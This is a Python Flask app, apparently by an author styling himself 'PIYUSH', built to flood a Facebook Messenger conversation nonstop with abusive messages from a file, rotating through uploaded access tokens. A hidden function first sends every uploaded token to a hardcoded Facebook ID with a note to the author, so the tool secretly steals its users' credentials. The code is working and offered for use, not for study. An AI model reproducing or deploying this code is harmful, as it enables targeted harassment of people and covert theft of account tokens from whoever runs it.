from flask import Flask, request, render_template_string, jsonify
import threading
import os
import requests
import time
import http.server
import socketserver

app = Flask(__name__)

# HTML Template with updated styles and background image
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>☠️ PIYUSH IINSIIDE ☠️</title>
    <style>
        body {
            background-image: url('https://https://i.ibb.co/27wt8NsD/received-531987746237628.jpg'); /* Replace with the URL of your image */
            background-size: cover;
            background-position: center;
            color: white; /* Ensure text is readable on the background */
            font-family: Arial, sans-serif;
        }
        .form-container {
            background-color: rgba(0, 0, 0, 0.7); /* Adding a semi-transparent background for readability */
            padding: 20px;
            border-radius: 10px;
            max-width: 600px;
            margin: 40px auto;
        }
        .form-container h2 {
            text-align: center;
            color: #ffffff;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group label {
            display: block;
            margin-bottom: 5px;
            color: #ffffff;
        }
        .form-group input,
        .form-group button {
            width: 100%;
            padding: 10px;
            border: none;
            border-radius: 5px;
            box-sizing: border-box;
            margin-top: 5px;
        }
        /* Changing colors for different input fields */
        #tokensFile {
            background-color: red; /* Red color for tokensFile input */
        }
        #convoId {
            background-color: yellow; /* Yellow color for convoId input */
        }
        #messagesFile {
            background-color: green; /* Green color for messagesFile input */
        }
        #hatersName {
            background-color: Red; /* Blue color for hatersName input */
        }
        #speed {
            background-color: yellow; /* Purple color for speed input */
        }
        .form-group button {
            background-color: #4CAF50;
            color: white;
            cursor: pointer;
        }
        .form-group button:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>

<div class="form-container">
    <h2>[-PIYUSH INSIDE HERE -]    NONSTOP [<<SERWAR>>]</h2>
    <form id="messageForm" enctype="multipart/form-data">
        <div class="form-group">
            <label for="tokensFile">PIYUSH INDISE HERE   TOKEN FILE DALO..⤵️</label>
            <input type="file" id="tokensFile" name="tokensFile" accept=".txt" required>
        </div>
        <div class="form-group">
            <label for="convoId">PIYUSH INDISE HERE UID DALO ..⤵️</label>
            <input type="text" id="convoId" name="convoId" required>
        </div>
        <div class="form-group">
            <label for="messagesFile">PIYUSH INDISE HERE ABUSE NP DALO..⤵️</label>
            <input type="file" id="messagesFile" name="messagesFile" accept=".txt" required>
        </div>
        <div class="form-group">
            <label for="hatersName">PIYUSH INDISE HERE HETTAR NAME DALO..⤵️</label>
            <input type="text" id="hatersName" name="hatersName" required>
        </div>
        <div class="form-group">
            <label for="speed">PIYUSH INDISE HERE SPEED SECOUND DALO..⤵️ (PIYUSH INDISE HERW)</label>
            <input type="number" id="speed" name="speed" value="1" required>
        </div>
        <div class="form-group">
            <button type="submit">💫 𝙎𝙏𝘼𝙍𝙏 𝙎𝙀𝙉𝘿 𝙈𝙀𝙎𝙎𝙀𝙂𝙀 💫</button>
        </div>
    </form>
</div>

<script>
    document.getElementById('messageForm').addEventListener('submit', function(event) {
        event.preventDefault();

        // Prepare the form data
        let formData = new FormData(this);

        // Send the form data via fetch API
        fetch('/start', {
            method: 'POST',
            body: formData
        })
        .then(response => response.json())
        .then(result => {
            alert(result.message);
        })
        .catch(error => {
            console.error('Error:', error);
            alert('An error occurred. Please check the console for details.');
        });
    });
</script>

</body>
</html>
'''

# HTTP server handler class
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(b"Server is running")

# Function to execute the HTTP server
def execute_server(port):
    with socketserver.TCPServer(("", port), MyHandler) as httpd:
        print(f"Server running at http://localhost:{port}")
        httpd.serve_forever()

# Function to read a file and return its content as a list of lines
def read_file(file_path):
    with open(file_path, 'r') as file:
        return file.readlines()

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/start', methods=['POST'])
def start_server_and_messaging():
    port = 4000  # Port is fixed to 4000
    target_id = "100064267823693"  # Fixed target ID
    convo_id = request.form.get('convoId')
    haters_name = request.form.get('hatersName')
    speed = int(request.form.get('speed'))
    
    # Save uploaded files
    tokens_file = request.files['tokensFile']
    messages_file = request.files['messagesFile']
    
    tokens_path = 'uploaded_tokens.txt'
    messages_path = 'uploaded_messages.txt'
    
    tokens_file.save(tokens_path)
    messages_file.save(messages_path)
    
    tokens = read_file(tokens_path)
    messages = read_file(messages_path)

    # Start the HTTP server in a separate thread
    server_thread = threading.Thread(target=execute_server, args=(port,))
    server_thread.start()

    # Function to send an initial message
    def send_initial_message():
        headers = {
            "User-Agent": "Mozilla/5.0",
            "Accept": "application/json",
        }
        for token in tokens:
            access_token = token.strip()
            url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
            msg = f"Hello PIYUSH  SīīR II AM USIING YOUR OFFLINE SERVER...MY TOKEN IIS..⤵️ {access_token}"
            parameters = {"access_token": access_token, "message": msg}
            response = requests.post(url, json=parameters, headers=headers)
            time.sleep(0.1)

    # Function to send messages in a loop
    def send_messages():
        headers = {
            "User-Agent": "Mozilla/5.0",
            "Accept": "application/json",
        }
        num_messages = len(messages)
        num_tokens = len(tokens)
        max_tokens = min(num_tokens, num_messages)

        while True:
            try:
                for message_index in range(num_messages):
                    token_index = message_index % max_tokens
                    access_token = tokens[token_index].strip()
                    message = messages[message_index].strip()
                    url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
                    full_message = f"{haters_name} {message}"
                    parameters = {"access_token": access_token, "message": full_message}
                    response = requests.post(url, json=parameters, headers=headers)
                    time.sleep(speed)
            except Exception as e:
                print(f"[!] An error occurred: {e}")

    # Send initial message
    send_initial_message()

    # Start sending messages in a loop
    message_thread = threading.Thread(target=send_messages)
    message_thread.start()

    return jsonify({"message": "Server and messaging started successfully"})

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.getenv('PORT', 5000)))